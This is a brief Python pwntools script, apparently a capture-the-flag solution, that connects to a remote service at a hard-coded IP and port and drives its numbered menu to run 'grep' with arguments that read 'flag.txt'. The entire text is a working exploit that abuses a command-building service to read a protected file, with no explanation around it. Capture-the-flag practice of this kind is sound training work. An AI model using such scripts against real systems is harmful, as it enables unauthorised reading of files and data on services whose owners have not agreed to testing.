from pwn import *

HOST = "154.57.164.67"
PORT = 30748

io = remote(HOST, PORT)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"(mode)> ", b"~0")

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"(bin)> ", b"grep")

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"(arg1,arg2)> ", b"flag.txt,aaaa")

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"(switch1,switch2)> ", b"ZZZ,ZZZ")

io.sendlineafter(b"> ", b"5")

io.interactive()
